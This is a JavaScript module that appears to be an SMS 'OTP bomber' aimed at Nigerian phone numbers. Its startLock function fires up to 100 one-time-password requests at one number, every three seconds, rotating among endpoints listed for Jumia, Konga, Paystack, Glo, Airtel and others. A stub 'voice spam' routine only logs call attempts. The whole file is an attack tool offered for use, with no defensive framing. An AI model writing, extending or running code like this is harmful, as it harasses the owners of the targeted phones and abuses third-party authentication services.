const axios = require("axios");
const fs = require("fs");
const path = require("path");

const MAX_REQUESTS_PER_NUMBER = 100;
const COOLDOWN_PERIOD = 5 * 60 * 1000;
const REQUEST_DELAY = 3000;
const VOICE_DELAY = 5000;

const activeLocks = new Map();
const numberHistory = new Map();
const userHistories = new Map();
const voiceSpam = new Map();

function formatNumber(number) {
    let cleaned = number.replace(/\D/g, "");
    
    if (cleaned.startsWith("0")) {
        cleaned = "234" + cleaned.substring(1);
    } else if (cleaned.startsWith("234")) {
        // Already formatted
    } else if (cleaned.length === 10) {
        cleaned = "234" + cleaned;
    }
    
    return cleaned;
}

function getHistoryFile() {
    return path.join(__dirname, "..", "data", "history.json");
}

function loadHistory() {
    try {
        const file = getHistoryFile();
        if (fs.existsSync(file)) {
            const data = fs.readFileSync(file, "utf8");
            const parsed = JSON.parse(data);
            for (const [number, history] of Object.entries(parsed)) {
                numberHistory.set(number, history);
            }
        }
    } catch (err) {
        console.error("[HISTORY] Load error:", err.message);
    }
}

function saveHistory() {
    try {
        const file = getHistoryFile();
        const dir = path.dirname(file);
        if (!fs.existsSync(dir)) {
            fs.mkdirSync(dir, { recursive: true });
        }
        const data = Object.fromEntries(numberHistory);
        fs.writeFileSync(file, JSON.stringify(data, null, 2));
    } catch (err) {
        console.error("[HISTORY] Save error:", err.message);
    }
}

loadHistory();

const providers = [
    {
        name: "Jumia",
        url: "https://api.jumia.com.ng/api/v1/auth/otp",
        method: "POST",
        buildPayload: (number) => ({ phone: number, type: "login" }),
        headers: { "Content-Type": "application/json" }
    },
    {
        name: "Konga",
        url: "https://api.konga.com/api/v1/auth/otp",
        method: "POST",
        buildPayload: (number) => ({ mobile: number }),
        headers: { "Content-Type": "application/json" }
    },
    {
        name: "Paystack",
        url: "https://api.paystack.co/otp",
        method: "POST",
        buildPayload: (number) => ({ mobile: number }),
        headers: { "Content-Type": "application/json" }
    },
    {
        name: "Flutterwave",
        url: "https://api.flutterwave.com/v3/otps",
        method: "POST",
        buildPayload: (number) => ({ mobile: number }),
        headers: { "Content-Type": "application/json" }
    },
    {
        name: "Slot",
        url: "https://api.slot.ng/api/v1/auth/otp",
        method: "POST",
        buildPayload: (number) => ({ phone: number }),
        headers: { "Content-Type": "application/json" }
    },
    {
        name: "Glo",
        url: "https://api.gloworld.com/ng/otp",
        method: "POST",
        buildPayload: (number) => ({ msisdn: number }),
        headers: { "Content-Type": "application/json" }
    },
    {
        name: "9mobile",
        url: "https://api.9mobile.com.ng/otp",
        method: "POST",
        buildPayload: (number) => ({ msisdn: number }),
        headers: { "Content-Type": "application/json" }
    },
    {
        name: "Airtel",
        url: "https://api.airtel.ng/auth/otp",
        method: "POST",
        buildPayload: (number) => ({ msisdn: number }),
        headers: { "Content-Type": "application/json" }
    }
];

const voiceProviders = [
    {
        name: "Termux-Call",
        trigger: (number) => {
            console.log(`[VOICE] Triggering call to ${number}`);
        }
    },
    {
        name: "Missed-Call",
        trigger: (number) => {
            console.log(`[VOICE] Missed call to ${number}`);
        }
    }
];

async function startLock(number, sessionToken) {
    const formattedNumber = formatNumber(number);
    
    if (activeLocks.has(formattedNumber)) {
        const existing = activeLocks.get(formattedNumber);
        return {
            alreadyLocked: true,
            requestCount: existing.requestCount,
            number: formattedNumber
        };
    }
    
    const history = numberHistory.get(formattedNumber) || [];
    const lastLock = history[history.length - 1];
    
    if (lastLock && (Date.now() - lastLock.endTime) < COOLDOWN_PERIOD) {
        const retryAfter = Math.ceil((COOLDOWN_PERIOD - (Date.now() - lastLock.endTime)) / 1000);
        return {
            cooldown: true,
            retryAfter,
            number: formattedNumber
        };
    }
    
    const lockState = {
        number: formattedNumber,
        startTime: Date.now(),
        requestCount: 0,
        maxRequests: MAX_REQUESTS_PER_NUMBER,
        providers: providers.map(p => p.name),
        active: true,
        sessionToken,
        interval: null
    };
    
    activeLocks.set(formattedNumber, lockState);
    
    lockState.interval = setInterval(async () => {
        if (!lockState.active || lockState.requestCount >= lockState.maxRequests) {
            stopLock(formattedNumber, sessionToken);
            return;
        }
        
        const provider = providers[Math.floor(Math.random() * providers.length)];
        
        try {
            await axios({
                method: provider.method,
                url: provider.url,
                data: provider.buildPayload(formattedNumber),
                headers: provider.headers,
                timeout: 5000
            });
            
            lockState.requestCount++;
            console.log(`[OTP] ${provider.name} -> ${formattedNumber} (${lockState.requestCount}/${lockState.maxRequests})`);
            
        } catch (err) {
            console.log(`[OTP] ${provider.name} failed: ${err.message}`);
        }
        
    }, REQUEST_DELAY);
    
    return { number: formattedNumber, started: true };
}

async function stopLock(number, sessionToken) {
    const formattedNumber = formatNumber(number);
    const lockState = activeLocks.get(formattedNumber);
    
    if (!lockState) {
        return { error: "No active lock for this number" };
    }
    
    if (lockState.sessionToken !== sessionToken) {
        return { error: "Not authorized to stop this lock" };
    }
    
    if (lockState.interval) {
        clearInterval(lockState.interval);
    }
    
    lockState.active = false;
    lockState.endTime = Date.now();
    
    const historyEntry = {
        number: formattedNumber,
        startTime: lockState.startTime,
        endTime: lockState.endTime,
        requestCount: lockState.requestCount,
        duration: lockState.endTime - lockState.startTime
    };
    
    if (!numberHistory.has(formattedNumber)) {
        numberHistory.set(formattedNumber, []);
    }
    numberHistory.get(formattedNumber).push(historyEntry);
    
    if (!userHistories.has(sessionToken)) {
        userHistories.set(sessionToken, []);
    }
    userHistories.get(sessionToken).push(historyEntry);
    
    saveHistory();
    activeLocks.delete(formattedNumber);
    
    return {
        stopped: true,
        number: formattedNumber,
        totalRequests: lockState.requestCount,
        duration: historyEntry.duration
    };
}

async function getStatus(number, sessionToken) {
    const formattedNumber = formatNumber(number);
    const lockState = activeLocks.get(formattedNumber);
    
    if (lockState) {
        return {
            active: true,
            number: formattedNumber,
            requestCount: lockState.requestCount,
            maxRequests: lockState.maxRequests,
            startTime: lockState.startTime,
            elapsed: Date.now() - lockState.startTime
        };
    }
    
    const history = numberHistory.get(formattedNumber) || [];
    const lastLock = history[history.length - 1];
    
    if (lastLock) {
        const cooldownEnd = lastLock.endTime + COOLDOWN_PERIOD;
        const inCooldown = Date.now() < cooldownEnd;
        
        return {
            active: false,
            number: formattedNumber,
            lastLock: {
                requestCount: lastLock.requestCount,
                endTime: lastLock.endTime
            },
            inCooldown,
            cooldownEndsIn: inCooldown ? Math.ceil((cooldownEnd - Date.now()) / 1000) : 0
        };
    }
    
    return {
        active: false,
        number: formattedNumber,
        neverLocked: true
    };
}

async function getUserHistory(sessionToken) {
    const userHistory = userHistories.get(sessionToken) || [];
    return userHistory
        .sort((a, b) => b.endTime - a.endTime)
        .slice(0, 50);
}

async function startVoiceSpam(number, sessionToken) {
    const formattedNumber = formatNumber(number);
    
    if (voiceSpam.has(formattedNumber)) {
        return {
            alreadyActive: true,
            callCount: voiceSpam.get(formattedNumber).callCount
        };
    }
    
    const history = numberHistory.get(formattedNumber) || [];
    const lastLock = history[history.length - 1];
    
    if (lastLock && (Date.now() - lastLock.endTime) < COOLDOWN_PERIOD) {
        const retryAfter = Math.ceil((COOLDOWN_PERIOD - (Date.now() - lastLock.endTime)) / 1000);
        return {
            cooldown: true,
            retryAfter
        };
    }
    
    const voiceState = {
        number: formattedNumber,
        startTime: Date.now(),
        callCount: 0,
        maxCalls: 50,
        active: true,
        sessionToken,
        interval: null
    };
    
    voiceSpam.set(formattedNumber, voiceState);
    
    voiceState.interval = setInterval(() => {
        if (!voiceState.active || voiceState.callCount >= voiceState.maxCalls) {
            stopVoiceSpam(formattedNumber, sessionToken);
            return;
        }
        
        const provider = voiceProviders[Math.floor(Math.random() * voiceProviders.length)];
        provider.trigger(formattedNumber);
        
        voiceState.callCount++;
        console.log(`[VOICE] ${provider.name} -> ${formattedNumber} (${voiceState.callCount}/${voiceState.maxCalls})`);
        
    }, VOICE_DELAY);
    
    return { number: formattedNumber, started: true };
}

async function stopVoiceSpam(number, sessionToken) {
    const formattedNumber = formatNumber(number);
    const voiceState = voiceSpam.get(formattedNumber);
    
    if (!voiceState) {
        return { error: "No active voice spam for this number" };
    }
    
    if (voiceState.sessionToken !== sessionToken) {
        return { error: "Not authorized to stop this voice spam" };
    }
    
    if (voiceState.interval) {
        clearInterval(voiceState.interval);
    }
    
    voiceState.active = false;
    voiceState.endTime = Date.now();
    
    const historyEntry = {
        number: formattedNumber,
        type: "voice",
        startTime: voiceState.startTime,
        endTime: voiceState.endTime,
        callCount: voiceState.callCount,
        duration: voiceState.endTime - voiceState.startTime
    };
    
    if (!userHistories.has(sessionToken)) {
        userHistories.set(sessionToken, []);
    }
    userHistories.get(sessionToken).push(historyEntry);
    
    voiceSpam.delete(formattedNumber);
    
    return {
        stopped: true,
        number: formattedNumber,
        totalCalls: voiceState.callCount
    };
}

async function getVoiceStatus(number, sessionToken) {
    const formattedNumber = formatNumber(number);
    const voiceState = voiceSpam.get(formattedNumber);
    
    if (voiceState) {
        return {
            active: true,
            number: formattedNumber,
            callCount: voiceState.callCount,
            maxCalls: voiceState.maxCalls,
            startTime: voiceState.startTime,
            elapsed: Date.now() - voiceState.startTime
        };
    }
    
    return {
        active: false,
        number: formattedNumber
    };
}

async function getStats() {
    return {
        activeLocks: activeLocks.size,
        activeVoiceSpams: voiceSpam.size,
        totalNumbersLocked: numberHistory.size,
        totalLocks: Array.from(numberHistory.values()).reduce((sum, h) => sum + h.length, 0)
    };
}

setInterval(() => {
    const now = Date.now();
    
    for (const [number, lock] of activeLocks.entries()) {
        if (now - lock.startTime > 60 * 60 * 1000) {
            console.log(`[CLEANUP] Force stopping stale lock: ${number}`);
            stopLock(number, lock.sessionToken);
        }
    }
    
    for (const [number, spam] of voiceSpam.entries()) {
        if (now - spam.startTime > 30 * 60 * 1000) {
            console.log(`[CLEANUP] Force stopping stale voice spam: ${number}`);
            stopVoiceSpam(number, spam.sessionToken);
        }
    }
}, 5 * 60 * 1000);

module.exports = {
    startLock,
    stopLock,
    getStatus,
    getUserHistory,
    startVoiceSpam,
    stopVoiceSpam,
    getVoiceStatus,
    getStats
};
